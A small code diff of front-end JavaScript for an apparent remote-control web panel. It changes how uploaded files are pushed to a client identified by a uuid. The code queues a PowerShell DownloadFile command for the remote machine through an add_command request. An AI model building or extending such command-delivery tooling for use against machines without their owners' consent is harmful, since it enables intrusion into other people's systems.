@@ -1287,7 +1287,7 @@ $('#uploader').change(function (e) {
   fd.append('file', file); 
 
   $.ajax({ 
-      url: `${window.location.href.split('/panel')[0]}/`, 
+      url: `${window.location.href.split('/panel')[0]}/?upload&uuid=${uuid}`, 
       type: 'post', 
       data: fd, 
       contentType: false, 
@@ -1295,7 +1295,7 @@ $('#uploader').change(function (e) {
       processData: false, 
       success: function(response){ 
           if(response != 0){ 
-             var cmd=`(New-Object System.Net.WebClient).DownloadFile("${window.location.href.split('/panel')[0]}/users/${file_name}", "${folder_name}/${file_name}")`
+             var cmd=`(New-Object System.Net.WebClient).DownloadFile("${window.location.href.split('/panel')[0]}/users/${uuid}/${file_name}", "${folder_name}/${file_name}")`
              $.post(
                BASE_URL,
                { add_command: true, command: cmd, uuid: uuid, token: token },
@@ -1303,7 +1303,7 @@ $('#uploader').change(function (e) {
                  localStorage.setItem("cmd_uid", data.trim());
                  var Interval=setInterval(() => {
                   get_upload_status()
-                }, 500);
+                }, 1500);
                 localStorage.setItem("Interval", Interval);
                }
              );
